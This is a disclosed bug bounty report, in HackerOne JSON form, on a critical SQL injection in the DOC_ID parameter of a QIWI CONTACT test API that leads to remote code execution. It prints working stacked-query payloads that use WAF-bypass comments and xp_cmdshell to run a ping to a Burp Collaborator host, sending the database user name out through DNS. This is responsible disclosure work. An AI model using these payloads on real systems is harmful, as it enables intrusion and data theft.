{"id":1104111,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTA0MTEx","url":"https://hackerone.com/reports/1104111","title":"Remote Code Execution on contactws.contact-sys.com via SQL injection in TPrabhuObject.BeginOrder in parameter DOC_ID","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2021-02-16T09:49:51.031Z","submitted_at":"2021-02-16T09:49:51.081Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"honoki","url":"/honoki","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":215,"url":"https://hackerone.com/qiwi","handle":"qiwi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"QIWI","twitter_handle":"QiwiRussia","website":"https://qiwi.com","about":"The QIWI brand is a family brand that consolidates several directions: kiosks, wallet, bank and even terminals of goods delivery."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-04-14T08:35:06.041Z","bug_reporter_agreed_on_going_public_at":"2021-03-25T15:39:25.010Z","team_member_agreed_on_going_public_at":"2021-04-14T08:35:05.899Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\n\nThe API interface on https://contactws.contact-sys.com:3456/ accepts a `\u003cREQUEST/\u003e` body to interact with the server's AppServ object. Because of insufficient input validation, an attacker can abuse the `DOC_ID` parameter on the `TPrabhuObject` operation `BeginOrder` to inject arbitrary SQL statements into the underlying prepared statement. This leads to Remote Code Execution on the server and full database access to the underpinning database.\n\n## Technical details\n\nThe interface on `contactws.contact-sys.com:3456` offers a test environment for CONTACT integrators to test their integrations. It accepts `\u003cREQUEST/\u003e` messages to the AppServ object.\n\nAfter my similar reports from last year (See #816560, #816254, #816086) I decided to continue digging, and found the object class `TPrabhuObject` with action `BeginOrder`, which appeared to contain an SQL vulnerability, as evidenced by this request:\n\n```xml\n\u003cREQUEST OBJECT_CLASS=\"TPrabhuObject\" ACTION=\"BeginOrder\" ExpectSigned=\"No\" INT_SOFT_ID=\"DA61D1CE-757F-44C3-B3F7-11A026C37CD4\" POINT_CODE=\"tzhr\" lang=\"en\"\u003e\u003c/REQUEST\u003e\n```\n```xml\n\u003cRESPONSE SIGN_IT=\"1\" RE=\"-6068\" ERR_TEXT=\"Incorrect syntax near '='\" GLOBAL_VERSION=\"15.11.2013 12:37:40\" GLOBAL_VERSION_SERVER=\"18.03.2018 21:03:00\"/\u003e\n```\n\nBy brute-forcing attributes in the request, I discovered that the `DOC_ID` parameter was vulnerable:\n```xml\n\u003cREQUEST OBJECT_CLASS=\"TPrabhuObject\" DOC_ID=\"abc\" ACTION=\"BeginOrder\" ExpectSigned=\"No\" INT_SOFT_ID=\"DA61D1CE-757F-44C3-B3F7-11A026C37CD4\" POINT_CODE=\"tzhr\" lang=\"en\"\u003e\u003c/REQUEST\u003e\n```\n\n```xml\n\u003cRESPONSE SIGN_IT=\"1\" RE=\"-6068\" ERR_TEXT=\"Invalid column name 'abc'\" GLOBAL_VERSION=\"15.11.2013 12:37:40\" GLOBAL_VERSION_SERVER=\"18.03.2018 21:03:00\"/\u003e\n```\n\n\nTo exploit the vulnerability, it is possible to append an arbitrary number of SQL statements with the `;` delimiter, e.g. with `DOC_ID` set to:\n\n```sql\n3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping gn7ll5zpbouksfunsmig35nj8ae02p.burpcol'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3\n```\n\nNote the use of the comments `/* ... */` which are needed to bypass the WAF that was configured after my reports from last year.\n\n## Steps to reproduce\n\n1. Execute the following request (change the burp collaborator URL to your own);\n\n    ```http\n    POST / HTTP/1.1\nHost: contactws.contact-sys.com:3456\nContent-Type: application/xml\n    \n    \u003cREQUEST OBJECT_CLASS=\"TPrabhuObject\" ACTION=\"BeginOrder\" DOC_ID=\"3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.gn7ll5zpbouksfunsmig35nj8ae02p.burpcol'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3\" ExpectSigned=\"No\" INT_SOFT_ID=\"DA61D1CE-757F-44C3-B3F7-11A026C37CD4\" POINT_CODE=\"tzhr\" lang=\"en\"\u003e\u003c/REQUEST\u003e\n```\n\n4. Notice that the server waits for a while when it's executing the `ping` command, and observe your Burp Collaborator to see the DNS resolution of the ping request:\n\n    {F1197216}\n\n3. Note the DNS request contains `0x7300740065006e0064005f00610064006d00`, which decodes to `stend_admin`, the `SYSTEM_USER` name.\n\n## Disclaimer\n\nNote that I stopped all further testing after successfully confirming the `ping` command during validation of this bug, and after successfully leaking the `SYSTEM_USER` variable.\n\n## Recommendation\n\nSQL injection vulnerabilities can be remedied by escaping the user-supplied input instead of using it to construct a query. See the external references below for remediation details.\n\n## References\n\n[OWASP Prevention cheat sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md)\n\n## Impact\n\nBy executing arbitrary commands on the server, an attacker could compromise the integrity, availability and confidentiality of customer's financially sensitive data on the CONTACT server and database, and pivot onto other servers on the internal network.","bounty_amount":"2500.0","formatted_bounty":"$2,500","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1197216,"file_name":"BurpSuitePro_Zk8cEZUg93.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0bi6w8rgcvjhhkoze2tm6hlvz6z6?response-content-disposition=attachment%3B%20filename%3D%22BurpSuitePro_Zk8cEZUg93.png%22%3B%20filename%2A%3DUTF-8%27%27BurpSuitePro_Zk8cEZUg93.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132449Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8b7a0a13bdeae04583cc6b2ee71ff290ade9e9eed26fda6eda71f05c1688bcb1","file_size":38239,"type":"image/png"}],"allow_singular_disclosure_at":"2021-04-24T15:39:25.059Z","allow_singular_disclosure_after":-14679924.48994358,"singular_disclosure_allowed":true,"vote_count":50,"voters":["541n0","battle_angel","haxor31337","ninetynine","ali","theappsec","ibring","sudi","ms-13","0nlymohammed","and 40 more..."],"severity":{"rating":"critical","score":10.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":18737,"asset_type":"URL","asset_identifier":"*.contact-sys.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10682330,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the report. We'll investigate and comment in near future. ","automated_response":false,"created_at":"2021-02-16T09:52:16.300Z","updated_at":"2021-02-16T09:52:16.300Z","actor":{"username":"danr0","cleared":false,"url":"/danr0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3tVP7iXagmhQW2eYSzkZErvk/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10834671,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @danr0 - I haven't heard back on these reports for 10 days; is there any update on these?","automated_response":false,"created_at":"2021-03-01T07:31:02.743Z","updated_at":"2021-03-01T07:31:02.743Z","actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10837627,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi!\nSorry for inconvenience, we are waiting for transaction to charge our balance. I hope you will receive bounty in nearest days :)","automated_response":false,"created_at":"2021-03-01T11:07:40.247Z","updated_at":"2021-03-01T11:07:40.247Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10849338,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for your help!\nThe amount of bounty due the same reason as in previous reports (test payment functionality in test environment)","automated_response":false,"created_at":"2021-03-02T09:08:42.694Z","updated_at":"2021-03-02T09:08:42.694Z","actor":{"url":"/qiwi","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"QIWI"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"qiwi","collaborator":{"username":"honoki","url":"/honoki"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10849341,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2021-03-02T09:08:51.937Z","updated_at":"2021-03-02T09:08:51.937Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"honoki","url":"/honoki"},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10852160,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @vankyver - thanks for the info and the bounty! If you'll agree, I would also like to disclose these reports.\n\nKind regards,\nPieter","automated_response":false,"created_at":"2021-03-02T13:52:02.284Z","updated_at":"2021-03-02T13:52:02.284Z","first_to_agree":true,"actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10863020,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, yes we agree to disclose it, but not now.\nI think we will do it in two weeks when all other things that we found will be fixed.","automated_response":false,"created_at":"2021-03-03T09:39:22.036Z","updated_at":"2021-03-03T09:39:22.036Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10864875,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Perfect, thank you!","automated_response":false,"created_at":"2021-03-03T13:40:49.406Z","updated_at":"2021-03-03T13:40:49.406Z","actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11119119,"is_internal":false,"editable":false,"type":"Activities::CancelledDisclosureRequest","message":"We will try to disclose this report in next month.","automated_response":false,"created_at":"2021-03-25T14:01:57.951Z","updated_at":"2021-03-25T14:01:57.951Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11120667,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Ok, I'm requesting disclosure again to accept when you're ready.","automated_response":false,"created_at":"2021-03-25T15:39:25.032Z","updated_at":"2021-03-25T15:39:25.032Z","first_to_agree":true,"actor":{"username":"honoki","cleared":true,"url":"/honoki","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11389418,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-04-14T08:35:05.936Z","updated_at":"2021-04-14T08:35:05.936Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11389419,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-04-14T08:35:06.093Z","updated_at":"2021-04-14T08:35:06.093Z","actor":{"username":"vankyver","cleared":false,"url":"/vankyver","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"qiwi","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}